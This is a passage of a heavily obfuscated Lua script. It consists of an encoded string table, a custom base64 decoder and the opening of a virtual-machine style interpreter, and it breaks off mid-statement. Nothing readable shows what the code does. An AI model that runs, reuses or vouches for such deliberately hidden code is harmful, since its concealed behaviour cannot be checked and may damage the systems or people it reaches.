,""\110\083\090\066\052\077\053\082"";""\122\105\102\086"",""\087\055\117\117\082\113\069\082\119\080\069\056\114\086\047\098\108\113\120\120\076\102\061\061"";""\075\075\070\054"",""\102\090\109\108\071\054\082\117\084\118\047\043\114\102\085\117\054\101\085\118\066\114\111\055\090\076\089\108\112\114\047\054\119\101\048\049\053\067\061\061"",""\043\050\108\072\084\115\082\072\098\069\084\054\082\078\082\113\103\050\057\049\101\102\061\061"",""\099\119\117\098\088\118\101\098\114\080\100\109\053\103\086\076"";""\051\119\047\061"";""\077\108\082\088\116\100\102\079"",""\053\080\120\112\089\103\107\104"",""\050\068\084\120\105\055\049\116\054\111\108\117\098\076\104\083\050\073\108\061"";""\080\078\080\055\050\080\103\113\053\068\087\061"";""\082\099\102\068\121\057\049\076\082\102\061\061"",""\101\080\086\066\114\080\086\076\089\083\098\097\053\099\061\061"",""\081\080\086\066\051\077\086\066\088\118\101\112\088\083\100\098"";""\085\110\098\116\110\066\107\115\114\066\112\087\110\103\082\099"";""\082\071\052\066\081\113\117\069\103\118\070\073\043\067\089\083\067\049\114\061"";""\114\080\086\066\099\080\090\076\053\099\061\061"",""\069\043\117\116\085\114\052\101\048\050\072\108\043\055\110\120"";""\050\111\083\101\115\074\050\071\088\051\087\061"",""\106\052\070\048\115\066\090\056\047\118\087\043\116\054\102\061"",""\090\072\068\104\083\107\071\049\071\066\089\068\053\103\066\119\077\082\075\048\106\107\070\061"";""\102\049\053\057\109\107\080\085\052\074\108\070\106\067\084\120\122\074\102\077\112\108\061\061"";""\113\068\108\053\105\053\101\071\075\107\104\057\049\067\061\061"";""\065\114\107\086\085\083\053\047\103\113\055\122\120\050\065\120"",""\089\097\056\099\111\090\086\106\055\102\061\061"";""\053\069\053\113\115\067\049\117\086\078\114\078\078\068\077\052\122\105\084\052\075\085\098\066"";""\075\065\107\051\120\073\122\056\110\075\098\049\071\081\106\121\104\051\048\118\088\102\061\061"",""\074\077\048\106\106\121\047\061"",""\047\066\053\047\107\121\121\083\099\043\086\066\085\056\107\080\114\114\099\061"",""\051\073\078\061"";""\108\086\097\052"",""\080\108\061\061"";""\078\077\047\068\104\100\049\101\077\111\088\065\117\114\078\099\098\073\079\076\111\068\080\073\050\117\114\109\089\049\053\081\071\074\056\054\116\101\048\057\088\078\081\110\085\068\114\052\065\097\080\112\111\117\070\106\068\079\112\067\106\087\071\111\068\102\061\061"",""\099\066\053\076\088\077\120\098"",""\088\053\066\098\051\101\082\100\083\099\103\069\054\048\081\085\075\100\087\061"";""\067\057\069\108\118\066\116\076\114\056\108\069\106\076\085\070\103\043\111\083\107\067\061\061"",""\121\057\097\114\074\068\101\113\076\075\112\109"",""\066\043\089\102\121\074\057\116\119\097\055\085\101\120\103\102\051\056\104\061"";""\088\109\118\084"";""\118\066\081\061"",""\089\108\113\106\070\048\050\120\066\073\114\101"",""\052\114\108\067\080\043\043\075\087\103\056\056"";""\079\055\098\070\097\080\054\089\122\083\087\049"";""\051\056\120\104\077\097\107\100\052\083\098\106\053\066\082\107\107\121\056\061"",""\065\068\087\081\067\077\085\113\068\054\047\061"",""\052\086\112\110\107\119\121\122\086\073\101\055\047\110\107\105\051\108\061\061"",""\073\100\053\078\053\102\061\061"",""\052\103\083\050\078\067\061\061"",""\065\120\118\084\056\067\061\061"",""\112\081\053\068\098\065\056\061"";""\118\088\050\048\048\098\119\073"";""\051\054\113\047"",""\043\043\084\122\089\102\061\061"",""\071\105\069\080\116\086\083\122\079\115\088\103\121\053\097\106\098\097\111\103\108\090\106\057\086\115\114\086\090\108\061\061"",""\079\088\111\054\121\089\114\061"",""\089\103\121\057\051\103\114\061"";""\051\101\103\084\085\067\049\047\082\074\069\117\078\116\108\055\116\049\076\089\108\088\081\071\087\108\061\061"",""\084\085\115\066\121\081\120\075\106\112\112\067"";""\067\102\051\050\098\122\087\069\107\055\114\061"",""\114\066\065\106"";""\053\108\056\106\106\057\121\087\109\067\043\097"",""\049\080\109\116\083\116\115\105\087\076\104\061"",""\120\110\056\107\067\097\118\109\057\110\083\077"",""\067\052\081\056\079\102\061\061"",""\069\049\070\055\048\108\061\061"";""\077\078\106\088\065\098\108\082\066\113\080\088\111\103\104\061"",""\114\066\102\112\098\070\068\054\083\086\089\050\102\052\120\051\048\105\071\104\065\110\117\097\057\101\069\054\084\066\057\080\117\080\066\078\120\116\104\103\089\108\052\074"";""\073\112\065\103\090\118\089\053\067\111\067\055\072\102\061\061"";""\089\077\082\067\088\077\107\075"";""\085\105\101\066\081\078\089\098\089\108\061\061"",""\088\103\111\079\118\102\061\061"",""\114\086\107\057\099\080\090\115\049\078\112\104\049\098\107\075\051\099\061\061"";""\054\076\056\083"",""\070\075\081\068\083\102\120\075\043\098\068\061"";""\057\102\080\110\043\067\049\099\087\120\111\071\080\116\083\105\084\109\098\122\054\067\061\061"",""\051\075\112\117\120\067\061\061"",""\101\077\082\120\051\099\061\061"",""\052\084\115\074\115\099\061\061"",""\047\119\081\100\077\098\107\114\114\066\112\100\049\056\109\072\081\102\061\061"";""\097\090\115\116\074\102\061\061"",""\073\077\117\113"";""\048\081\076\080\104\088\100\071\081\099\061\061"",""\089\097\071\101\077\056\048\076\052\056\117\066\085\086\101\100"";""\081\106\056\078"",""\084\106\103\090\085\075\099\061"",""\101\099\081\107"",""\098\089\084\107"";""\113\047\115\102\069\080\051\119\113\085\068\061"";""\118\117\100\113\097\077\119\056\099\053\050\067\115\097\066\061"";""\067\099\052\074"";""\067\075\067\070\071\081\098\080\089\103\077\102\086\101\108\090\120\102\061\061"",""\110\056\102\072\050\099\085\112\121\102\061\061"";""\083\098\098\084\043\090\048\061"",""\054\043\098\083\112\111\071\082\089\089\068\052\107\101\051\122"";""\117\085\053\113\055\089\049\053\112\075\120\086\076\055\072\117\105\090\114\061"",""\097\100\113\115\072\102\061\061"";""\111\079\104\113\071\083\055\080\067\081\100\082\080\108\061\061"",""\088\077\098\054\121\111\079\108\122\102\061\061"",""\088\043\098\066\053\099\061\061"";""\101\103\086\069\089\105\117\074\049\099\061\061"";""\099\119\117\098\088\118\101\098\099\043\086\066\089\103\090\106"";""\051\073\053\104\099\066\107\118\107\073\047\119\101\083\070\100\088\102\061\061"";""\066\053\112\115\112\078\078\061"";""\115\101\097\113\087\114\099\057\104\108\097\118\117\065\056\110\072\085\052\106\074\108\061\061"";""\090\080\080\068\109\074\068\061"",""\122\086\083\051\082\111\115\088\105\116\114\061"",""\121\057\110\084\088\049\088\056\105\066\105\080\105\115\118\056\090\108\061\061"",""\101\082\122\104\098\102\061\061"",""\089\103\121\069\052\067\061\061"",""\098\074\081\119\108\115\110\056\113\067\061\061"";""\073\074\117\079\056\099\061\061"";""\089\067\065\047"",""\089\080\090\076\052\119\107\067\088\077\107\098"";""\105\074\101\090\066\099\061\061"",""\113\114\082\102\069\097\122\099\076\102\061\061"",""\121\077\098\107\099\121\077\104\117\121\068\061"",""\107\113\051\054\099\087\122\078\111\067\061\061"";""\114\055\052\120\101\099\061\061"";""\085\100\107\111\116\115\051\100\119\067\071\109\075\102\061\061"",""\102\077\073\090"",""\114\057\070\088\072\089\108\108\077\069\084\120\051\107\088\120\090\078\117\079\076\122\070\084\087\099\057\097\112\068\079\048\066\119\109\080\072\108\061\061"";""\102\074\080\073\087\090\122\103\120\084\116\073\086\101\114\061"";""\073\109\097\116\087\070\119\074"",""\114\049\068\054\087\050\079\108\105\118\108\109\077\077\113\074"";""\054\078\115\101\101\066\109\082\077\078\109\084\049\097\112\084\101\067\061\061"",""\049\071\098\068\115\084\047\061"",""\068\074\104\112\053\120\085\118\048\117\106\075\068\054\084\105\078\077\088\061"",""\055\105\103\051\080\100\070\061"",""\065\065\043\076\090\102\061\061"";""\081\107\103\080"",""\053\072\115\069\075\118\113\109\047\102\108\061"",""\107\115\070\082\047\068\088\113\107\054\080\052\101\073\043\104\099\114\049\120\104\080\088\082\071\067\061\061"",""\097\078\056\052\053\099\061\061"";""\113\102\104\116\052\116\066\097\107\043\048\055\054\110\105\086\086\108\087\117"",""\113\069\115\073\069\106\087\061"";""\099\112\107\085\098\108\061\061"",""\113\105\101\071\054\099\061\061"",""\088\080\090\106\088\080\121\066"";""\051\098\070\073\102\067\088\108\084\107\082\050\083\108\061\061"",""\070\080\104\110\043\067\061\061"";""\053\072\082\099\068\106\113\099\047\067\061\061"";"""",""\067\099\079\081\105\121\076\069\077\067\056\082\073\098\054\053\102\077\108\098\116\109\108\068\110\081\074\079\114\072\068\061"";""\049\073\117\103\089\103\089\043\047\114\109\067\088\080\082\112\101\080\088\061"",""\083\087\103\065\107\108\061\061"";""\089\103\121\107\101\105\089\099\107\056\081\076\047\077\117\088\099\080\114\061"",""\050\114\107\103\066\099\061\061"";""\088\099\121\078\069\067\061\061"",""\054\103\082\086\114\077\066\076\114\078\088\069\089\121\098\084\081\099\061\061"";""\118\087\065\073\084\099\088\061"";""\118\087\116\100\055\078\099\078\078\104\106\098\088\120\088\043"",""\052\116\099\073\107\075\078\061"";""\054\098\089\108\105\089\102\078\073\103\078\061"",""\118\120\090\070\053\077\068\061"",""\076\073\114\047\088\105\070\074\048\083\076\115\116\086\116\078\107\083\048\109\099\053\055\053"",""\072\074\099\082\065\052\099\070\070\081\067\122\053\108\118\049\073\108\061\061"";""\054\073\111\055\071\120\077\053\112\055\070\061"";""\074\113\115\114\117\099\061\061"";""\080\072\112\084\107\067\061\061"",""\107\117\114\099\066\102\047\057\104\121\066\061"",""\056\117\114\047\081\116\121\116"";""\085\073\075\077\048\108\088\061"",""\089\054\106\121\072\082\066\109\120\090\067\108\110\085\088\115"",""\068\112\110\054\111\109\056\061"";""\068\107\069\100\086\115\075\080\106\043\056\066\103\054\120\066\048\067\048\061"";""\066\071\103\111\085\048\104\061"",""\101\080\086\066\099\080\100\109\053\077\082\066\085\077\099\061"";""\050\050\109\075\118\070\082\048"";""\052\115\110\083"",""\071\071\052\056"";""\054\119\079\090\115\079\078\098\079\119\050\066\049\090\111\087\097\067\061\061"",""\085\086\109\081\066\106\047\054\107\071\047\117\112\055\052\079\112\065\071\118\050\071\047\070\113\086\054\088\098\078\088\057\078\050\051\052"",""\083\115\070\066\082\086\114\054\089\106\054\047\105\089\107\056"",""\049\114\101\121\120\108\061\061"",""\074\075\049\049\078\116\083\052\087\102\119\048\051\087\121\114\074\104\122\108"",""\056\102\118\105\117\053\080\119\088\078\108\061"";""\087\109\119\088\105\102\061\061"",""\099\116\097\078\086\121\076\119\114\082\115\118"",""\081\080\086\066\088\080\100\109\081\103\117\074\088\118\117\056"";""\119\107\088\118"",""\051\112\090\110\079\121\052\050\118\050\047\075\077\098\102\109\050\108\061\061"";""\119\109\103\117\088\074\104\100"",""\099\119\117\098\088\118\101\098\114\080\086\097\089\103\098\074\051\102\061\061"";""\100\087\097\051\067\056\083\078"",""\049\047\070\073\052\110\079\112\047\101\101\109\048\099\048\061"",""\107\055\056\107\085\111\102\112\085\110\108\084\103\080\115\106\055\099\061\061"",""\097\087\069\053\100\108\061\061"";""\049\090\120\119\097\080\116\102\066\067\061\061"",""\083\055\103\055\102\102\061\061"";""\106\078\079\086\116\071\075\088"",""\104\120\068\114\083\081\080\120\065\069\114\109\119\043\118\050"",""\099\071\080\115\047\109\066\116\112\051\087\061"";""\052\120\101\071\081\114\117\086\110\121\089\119\099\118\108\080\101\108\061\061"",""\105\115\106\071\102\107\078\080\105\102\118\089\052\085\110\055\048\051\081\103\114\102\061\061"";""\116\104\087\056\043\070\102\070\079\100\055\069\072\101\119\078\051\067\061\061"",""\101\114\115\120\086\078\089\115\081\097\112\067\049\098\081\068"",""\056\050\082\071\109\076\073\086\072\120\083\090\048\070\065\083\089\111\071\076\090\108\061\061"",""\082\056\079\078\098\102\061\061"";""\053\056\098\105\047\056\086\119\085\069\121\073\051\086\109\111\053\067\061\061"";""\104\113\071\087\049\114\053\122"";""\114\086\050\120"";""\097\055\056\057\111\067\061\061"",""\081\122\047\078\069\102\061\061"";""\066\066\070\084"";""\047\073\098\118\047\083\099\100"",""\106\056\067\057\073\067\061\061"",""\089\117\052\108\081\050\112\087\080\103\121\052\054\066\116\090\072\099\061\061"",""\097\112\052\078\078\048\054\122\050\122\048\121\049\074\057\087\099\084\118\117\097\090\084\043\074\070\048\061"";""\089\077\097\119\113\103\043\070\120\083\057\082\097\115\068\061"";""\085\118\107\071"",""\081\103\121\109\081\043\047\061"";""\079\057\073\078\071\053\051\049\122\099\061\061"";""\117\117\103\102\101\067\121\122\099\110\084\108\105\113\099\061"",""\087\069\066\089\083\057\090\082\101\111\114\061"",""\112\067\061\061"";""\101\118\089\112\082\102\107\054\111\079\103\114"";""\076\077\114\113\090\102\061\061""}local function E(E)return P[E+(-993655+1001078)]end for E,c in ipairs({{-35477+35478;-728651-(-729196)},{418295+-418294,-275592-(-275727)},{815043-814907,-774884-(-775429)}})do while c[975244+-975243]<c[-891479-(-891481)]do P[c[302621+-302620]],P[c[1005256-1005254]],c[-336370+336371],c[424643-424641]=P[c[-431077+431079]],P[c[68242-68241]],c[-849207-(-849208)]+(-453406-(-453407)),c[-52964-(-52966)]-(-540151+540152)end end do local E=table.insert local c=type local a={H=-125936+125994,q=121791-121760,j=353148+-353102,g=-684824+684830,N=813493+-813489,[""\050""]=715749+-715687;[""\055""]=-988252+988262,i=386088+-386081,l=-225042-(-225042),U=-980247+980265;[""\056""]=-470097-(-470133);b=-236137+236174;d=441385+-441336,t=-702257-(-702272),[""\053""]=-54887-(-54912);R=-687020+687077,Y=-284419-(-284448);C=974805+-974757;y=814213-814208;r=-188268+188288,Q=-1022193+1022221;Z=-374010+374071,B=884075+-884023,f=195709+-195677,n=593454-593435,I=193913-193910,[""\052""]=-224918-(-224944);V=-423074-(-423095),J=631630+-631583,T=-424472+424483;A=991115+-991056;G=312399-312398;[""\049""]=674548+-674518,X=348605-348581;F=-221422-(-221466);K=647255-647212,h=-41858+41898,P=683725-683671,z=-381608-(-381610),[""\047""]=-878204+878216;m=-87845-(-87886),a=903581+-903546;M=898870-898848,x=-892057+892110;D=505435+-505379,k=294994+-294981,[""\048""]=-695649+695709;u=-34484+34493;v=920719-920696;W=-815705+815713,E=349856-349805,S=870240-870202;e=92184-92167,p=-876312+876345,[""\043""]=-1040117-(-1040156);w=-235461+235516;s=509370+-509325,[""\057""]=329279+-329245,[""\054""]=-580293+580307,c=965205-965189;[""\051""]=-855356+855383,L=-415835+415885,o=-661639-(-661681),O=-657605-(-657668)}local B=string.char local t=math.floor local N=string.sub local T=P local q=table.concat local Z=string.len for P=-509432+509433,#T,175503-175502 do local O=T[P]if c(O)==""\115\116\114\105\110\103""then local c=Z(O)local C={}local S=46555+-46554 local o=122451-122451 local J=647968-647968 while S<=c do local P=N(O,S,S)local T=a[P]if T then o=o+T*(-915956+916020)^((727962+-727959)-J)J=J+(-386838+386839)if J==-879316-(-879320)then J=-723882+723882 local P=t(o/(85974-20438))local c=t((o%(75691+-10155))/(571188+-570932))local a=o%(-461856-(-462112))E(C,B(P,c,a))o=-684354-(-684354)end elseif P==""\061""then E(C,B(t(o/(904583-839047))))if S>=c or N(O,S+(180721+-180720),S+(334457+-334456))~=""\061""then E(C,B(t((o%(442927-377391))/(-951475-(-951731)))))end break end S=S+(-668681+668682)end T[P]=q(C)end end end return(function(P,a,B,t,N,T,q,c,C,v,K,o,W,J,O,H,L,X,S,s,V,Z,Y)s,Z,O,V,X,W,S,J,o,c,C,Y,K,L,H,v=function(P,E)local a=o(E)local B=function(B,t,N)return c(P,{B;t,N},E,a)end return B end,{},{},function(P,E)local a=o(E)local B=function(B,t,N,T)return c(P,{B,t;N,T},E,a)end return B end,function(P,E)local a=o(E)local B=function(B,t)return c(P,{B,t},E,a)end return B end,function(P,E)local a=o(E)local B=function(B)return c(P,{B},E,a)end return B end,-29889-(-29889),function(P)local E,c=-888336-(-888337),P[992385-992384]while c do O[c],E=O[c]-(532871+-532870),(-86133+86134)+E if O[c]==485387+-485387 then O[c],Z[c]=nil,nil end c=P[E]end end,function(P)for E=934278+-934277,#P,-698717-(-698718)do O[P[E]]=O[P[E]]+(-470711+470712)end if B then local c=B(true)local a=N(c)a[E(645806-652940)],a[E(397840+-404900)],a[E(748867-756218)]=P,J,function()return 1386624-71151 end return c else return t({},{[E(-347948+340888)]=J;[E(585317+-592451)]=P,[E(-432403-(-425052))]=function()return-357765+1673238 end})end end,function(c,B,t,N)local o,J,K_,d_,B_,F_,Q,E_,N_,k_,R,Z_,S,L_,G,j,D_,C_,D,q,P_,A,S_,b,g,O,v_,J_,r,e,w,H_,i,h_,t_,m_,s_,W_,y,d,o_,m,k,p,O_,l,z_,u,x_,a_,h,c_,Y_,T_,X_,I,n,K,x,V_,f,p_,u_,M,i_,z,F,q_,U while c do if c<-113219+8101801 then if c<3676766-(-33964)then if c<1335230-30796 then if c<525992-(-84886)then if c<-905841+1360293 then if c<-327250-(-546769)then if c<365517+-221084 then if c<-646508+704770 then k=Z[K]q=k c=-966639+1395148 else D=12340820216055-(-314747)k=Z[t[-377218+377220]]m=E(6792+-13790)F=Z[t[-244470-(-244473)]]i=F(m,D)K=k[i]J=S[K]K=E(897040+-904127)K=J[K]K=K(J)c=586089+14852556 q=K end else if c<1031512+-834285 then o=q J=Z[t[-222468+222469]]K=Z[t[258902+-258900]]F=E(-528828+521735)i=32757178181189-(-1021264)k=K(F,i)c=E(-115996+108714)c=o[c]q=J[k]c=c(o,q)J=c c=J and 22454-(-526962)or 913313+12684781 else c=true Z[t[662688-662685]]=c c=-158924+14281576 end end else if c<1003343-693098 then if c<-570832+814443 then S=E(462986+-470174)c=Z[t[613114-613113]]O=Z[t[499851+-499849]]S=c[S]q={S(c,O)}c=P[E(716130-723411)]q={a(q)}else c=1960057-120603 r=-192168-(-192168)x=#z p=x==r end else if c<903472-493987 then c={}Z[t[-210366+210368]]=c c=10726877-540604 q=Z[t[-1013828+1013831]]J=q K=35184372900042-811210 q=S%K Z[t[-363396+363400]]=q F=1011528-1011273 k=S%F F=801978+-801976 D=-447996+447997 i=E(-687382-(-680242))K=k+F Z[t[-462452-(-462457)]]=K F=P[i]i=E(-878415-(-871351))k=F[i]F=k(O)k=E(-152036-(-144673))o[S]=k h=D i=173436-173435 k=-234860-(-235016)D=-512899-(-512899)m=F d=h<D D=i-h else F=E(-324477+317298)k=q d=E(440231-447135)q=P[F]F=E(484721+-491747)c=q[F]F=C()i=E(896747+-903651)Z[F]=c q=P[i]i=E(-595910+588543)c=q[i]h=P[d]i=c m=h D=c c=h and 823176+14965776 or-692740+12822619 end end end else if c<463288+103361 then if c<9985-(-483913)then if c<719600-233981 then q=Z[t[-875703+875704]]c=q and 178862+7670649 or 656227+8364283 else O=B[689818+-689817]m=E(-192755+185431)o=Z[t[647376+-647375]]F=27765444887171-(-602110)k=E(-420522-(-413224))J=Z[t[419492+-419490]]K=J(k,F)S=o[K]D=8298037300021-785437 q=O[S]K=E(-421931+415048)J=P[K]k=Z[t[-685444+685445]]F=Z[t[744964+-744962]]i=F(m,D)K=k[i]o=J[K]K=Z[t[-962984+962985]]m=15005177346566-(-336197)k=Z[t[448945-448943]]i=E(559109-566483)F=k(i,m)J=K[F]S=o[J]c=q==S c=c and 4695008-(-663193)or 1754149-701027 end else if c<-863418+1418646 then q=Z[t[-565968+565969]]K=Z[t[804821-804819]]i=12537734906602-781340 F=E(-994764+987588)k=K(F,i)F=E(51263-58186)i=-454290+6547460717178 c=q[k]q=true J[c]=q q=Z[t[-432795-(-432796)]]K=Z[t[707411-707409]]k=K(F,i)c=q[k]q=O J[c]=q c=14070541-472447 else q=Z[K]m=Z[t[696918+-696916]]z=483547+25433345658216 d=E(-830713-(-823364))D=Z[t[-4645-(-4648)]]h=D(d,z)i=m[h]c=-815784+17469941 m=false q[i]=m end end else if c<1250331-677992 then if c<-93695+662943 then c=Z[t[365739+-365738]]O=B[705676-705675]S=B[687946+-687944]o=c c=o[S]c=c and 316652-(-252684)or 98808-(-237966)else c=2920567-(-402093)end else q=E(686355-693541)O=E(-696489-(-689468))c=P[q]q=c(O)c=P[E(-514403-(-507472))]q={}end end end else if c<1598330-716749 then if c<1012823-168859 then if c<-300863-(-960178)then if c<-556170+1196707 then O=E(-367650-(-360464))o=-70398-(-70398)c=P[O]S=Z[t[-81171+81179]]O=c(S,o)c=-210696+14555716 else I=L(I)R=L(R)U=L(U)Q=L(Q)c=840981-(-40871)y=nil e=L(e)n=L(n)end else if c<1638890-903624 then u=E(-437116+429866)c=P[u]Q=E(609754-616684)r=P[Q]u=c(r)c=E(-730199-(-723119))P[c]=u c=7655236-356322 else o=478996+-478831 S=Z[t[-637688+637690]]O=S*o S=1000389+13236501369934 q=O+S O=35184371314537-(-774295)c=q%O Z[t[-34174-(-34176)]]=c c=-283561+13114877 S=477505+-477504 O=Z[t[400808-400805]]q=O~=S end end else if c<524746-(-344757)then if c<-199654-(-1045111)then k=nil J=nil c=-263075+3585735 F=nil else c=false Z[t[-744477-(-744478)]]=c c=P[E(-720925+713713)]q={}end else c=q and 9431967-(-736569)or 196725+5732458 end end else if c<352693+714520 then if c<500735+539299 then if c<1657444-759922 then Q=not r G=G+u q=G<=g q=Q and q Q=G>=g Q=r and Q q=Q or q Q=7210946-934102 c=q and Q q=-745735+4692299 c=c or q else c=16281803-(-348274)end else if c<1459999-409894 then c=184820+5160162 M=-1029928-(-1029929)f=y[M]b=f else q={}O=nil c=P[E(21887-29056)]end end else if c<566379-(-709643)then if c<-187215+1378014 then S=Z[t[-7381+7382]]K=977716+-977714 J=497081-497080 o=S(J,K)S=-170230-(-170231)O=o==S q=O c=O and-70998+7737706 or-578273+11378718 else q=E(783455+-790781)c=P[q]O=Z[t[-780474-(-780475)]]q=c(O)c=P[E(-780860-(-773827))]q={}end else q=E(-816866-(-809745))K=E(-818017+810959)c=P[q]S=Z[t[470487+-470486]]q=E(700161+-707108)o=Z[t[451487+-451485]]k=-423919+13647512129730 q=c[q]J=o(K,k)O=S[J]q=q(c,O)O=E(-420054-(-412716))O=q[O]c={O(q)}q={a(c)}c=P[E(253153+-260277)]end end end end else if c<2744680-(-321319)then if c<142596+1836693 then if c<1149732-(-464478)then if c<826418+656425 then if c<1760999-339391 then q={}o=nil J=L(J)S=L(S)m=L(m)Q=nil R=nil i=nil c=P[E(-455810+448388)]D=nil r=nil x=nil k=L(k)K=L(K)z=L(z)p=L(p)F=nil d=L(d)else i=E(-830101+822696)c=463585+100044 q=Z[t[799717+-799712]]i=q[i]i=i(q)end else if c<-820599+2346612 then J=E(234557+-241754)o=P[J]i=E(-248449+241030)K=Z[t[383903-383900]]m=11480893490051-(-692575)k=Z[t[-547625-(-547629)]]F=k(i,m)k=308578+-308578 J=K[F]K=595143-595142 q=o[J]J=21831+-21831 o=q(J,K,k)c=S+o S=c c=179887+3070151 else k=c F=not O K=F c=F and-133000+14554718 or 8380344-(-200170)end end else if c<2708845-983696 then if c<1246303-(-407932)then T_,q_=t_(N_,T_)c=T_ and 9024866-657180 or 9910497-850569 else d=1042630+6413065757412 i=Z[t[-157523+157524]]h=E(1044640+-1051957)z=E(105056-112173)p=19511849510056-(-16085)m=Z[t[415862-415860]]D=m(h,d)c=i[D]D=Z[t[830462+-830461]]h=Z[t[568627+-568625]]d=h(z,p)x=1017954+30845751799737 p=E(544860+-551812)m=D[d]i=k[m]h=Z[t[945828-945827]]d=Z[t[-833970-(-833972)]]z=d(p,x)D=h[z]m=k[D]q={c;i,m}c=P[E(734460-741448)]end else x=-735326-(-735327)r=#z p=o(x,r)x=k(z,p)r=Z[d]n=184708+-184707 c=647150+12414014 e=x-n Q=F(e)p=nil r[x]=Q x=nil end end else if c<-93018+2840207 then if c<1897563-(-565596)then if c<2617364-499445 then K=E(238309-245430)z=194269+29683919011617 q=P[K]D=-924570+29209319575739 k=Z[t[-754468-(-754469)]]F=Z[t[840946+-840944]]h=E(-136753+129651)m=E(1033185-1040368)d=509945+24712832509178 i=F(m,D)K=k[i]c=q[K]k=Z[t[-148095-(-148096)]]F=Z[t[-403351+403353]]D=10400746618687-(-775084)m=E(-661894-(-654970))i=F(m,D)K=k[i]i=Z[t[1201-1200]]m=Z[t[659354-659352]]D=m(h,d)d=E(-784100-(-777178))F=i[D]p=-911173+5795077501391 x=-723828+13192159028083 m=Z[t[778079+-778078]]D=Z[t[602983+-602981]]h=D(d,z)i=m[h]z=E(716138-723214)G=32954219913981-(-891124)D=Z[t[558395+-558394]]h=Z[t[1009278+-1009276]]d=h(z,p)m=D[d]h=Z[t[-719192+719193]]d=Z[t[-351265+351267]]p=E(1017360-1024617)z=d(p,x)x=E(534312+-541422)D=h[z]q=E(-1029455-(-1022512))d=Z[t[-739848-(-739849)]]z=Z[t[190124+-190122]]p=z(x,G)h=d[p]q=c[q]d=-1023468-(-1023471)k={[F]=i,[m]=D,[h]=d}q=q(c,K,k)q={}c=P[E(-26888+19915)]else O=B o=E(-908735-(-901595))K=C()S=C()c=true Z[S]=c J=C()q=P[o]i=W(-231997+4157791,{K})o=E(-560708+553757)c=q[o]o=C()Z[o]=c c=s(1511691-921755,{})F=E(-323921+316636)Z[J]=c c=false Z[K]=c k=P[F]F=k(i)c=F and 722531+-694013 or 817362-388853 q=F end else if c<1016526+1609111 then k=11201715087098-135834 K=E(-2579+-4490)O=E(-442787+435391)q=P[O]S=Z[t[677027+-677026]]o=Z[t[-48695+48697]]J=o(K,k)O=S[J]c=q[O]O=1030448+-1030388 q=c(O)c=q and-498443+12424238 or 14295189-457989 else O=nil c=2376704-(-243566)end end else if c<-479382+3390342 then if c<2213914-(-565804)then O=nil c=P[E(-1048171+1041033)]q={}else r=Z[m]U=E(-332078-(-324715))y=1032000+29617566152351 n=Z[S]R=Z[J]I=R(U,y)c=15075887-970413 Q=n[I]x=r==Q z=x end else c=j P_=E(441211-448607)j=C()t_=E(-1026076-(-1018960))Z[j]=l c_=P[P_]E_=Z[S]a_=Z[J]N_=-87083+14288833818152 Z_=E(693723-700739)B_=a_(t_,N_)P_=E_[B_]l=c_[P_]o_=-54690+30054642273357 N_=10309281501251-(-279165)P_=Y(1507695-473710,{S;J;j,A})t_=E(-772155+764901)c_=l(P_)E_=Z[S]a_=Z[J]B_=a_(t_,N_)P_=E_[B_]a_=Z[S]C_=-718169+15100310966480 l=E(-663929-(-656756))B_=Z[J]q_=7967624596756-(-246122)T_=6642535979490-(-569907)V_=452206+27243591273248 N_=E(275043+-282318)t_=B_(N_,T_)E_=a_[t_]B_=Z[S]T_=E(238427+-245636)t_=Z[J]O_=318270+20315458177462 N_=t_(T_,q_)a_=B_[N_]B_=false N_=Z[S]T_=Z[J]q_=T_(Z_,O_)t_=N_[q_]T_=Z[S]q_=Z[J]O_=E(-724851+717501)z_=87298003461-(-175651)Z_=q_(O_,o_)W_=394778+10807919660430 N_=T_[Z_]o_=E(512568-519768)l=n[l]L_=-775515+32373322387518 q_=Z[S]Z_=Z[J]O_=Z_(o_,C_)K_=E(258174+-265225)T_=q_[O_]q_=X(15005125-(-1021743),{S;J})c_={[P_]=E_;[a_]=B_;[t_]=N_,[T_]=q_}o_=-1005363+25730786067968 l=l(n,c_)T_=19889562440960-880851 a_=Z[S]B_=Z[J]N_=E(930226+-937533)t_=B_(N_,T_)O_=E(729365+-736354)E_=a_[t_]T_=E(477923+-485119)Z_=15367551252138-(-632138)s_=32108333662194-476555 S_=24140709030624-704247 B_=Z[S]C_=E(-90724+83723)t_=Z[J]q_=-879346+30914015912749 N_=t_(T_,q_)a_=B_[N_]t_=Z[S]X_=26861412002136-342140 N_=Z[J]q_=E(304826+-311796)T_=N_(q_,Z_)N_=-507406+507407 B_=t_[T_]T_=-783994-(-784494)t_={N_,T_}T_=Z[S]q_=Z[J]Z_=q_(O_,o_)N_=T_[Z_]J_=25676833890225-225533 Z_=Z[S]T_=-447235+447236 O_=Z[J]o_=O_(C_,S_)S_=E(634726-641963)q_=Z_[o_]c_=E(700440-707394)O_=Z[S]o_=Z[J]C_=o_(S_,J_)Z_=O_[C_]J_=E(1002383+-1009405)o_=Z[S]C_=Z[J]S_=C_(J_,L_)O_=o_[S_]c_=n[c_]o_=833248-833232 S_=Z[S]J_=Z[J]L_=J_(K_,s_)C_=S_[L_]s_=E(-1001926+994899)J_=Z[S]L_=Z[J]K_=L_(s_,W_)W_=E(40052-47066)S_=J_[K_]L_=Z[S]K_=Z[J]s_=K_(W_,V_)J_=L_[s_]L_=X(12314105-948325,{S;J})P_={[E_]=a_,[B_]=t_,[N_]=T_,[q_]=Z_;[O_]=o_;[C_]=S_;[J_]=L_}c_=c_(n,P_)s_=E(-167964-(-160555))B_=Z[S]T_=E(910430+-917337)J_=724035+15449963253719 C_=1485786248520-275093 Z_=29542670372717-(-616015)q_=24127622222558-42747 t_=Z[J]N_=t_(T_,q_)a_=B_[N_]W_=832681+10995703095127 q_=E(-699202+692146)t_=Z[S]N_=Z[J]o_=E(100795+-107712)T_=N_(q_,Z_)B_=t_[T_]Z_=E(987546-994654)N_=Z[S]T_=Z[J]O_=-109860+15109164157087 K_=-704777+32473176488986 q_=T_(Z_,O_)t_=N_[q_]T_=-11605+11606 q_=-282462+282962 L_=515635249811-(-949853)N_={T_,q_}q_=Z[S]Z_=Z[J]O_=Z_(o_,C_)T_=q_[O_]q_=-231773-(-231774)S_=E(450628-457676)O_=Z[S]o_=Z[J]C_=o_(S_,J_)J_=E(-984582+977550)Z_=O_[C_]o_=Z[S]C_=Z[J]S_=C_(J_,L_)O_=o_[S_]C_=Z[S]L_=E(816443-823379)S_=Z[J]H_=24849951740375-353444 J_=S_(L_,K_)o_=C_[J_]J_=Z[S]L_=Z[J]V_=14225013512922-196858 C_=179143-179127 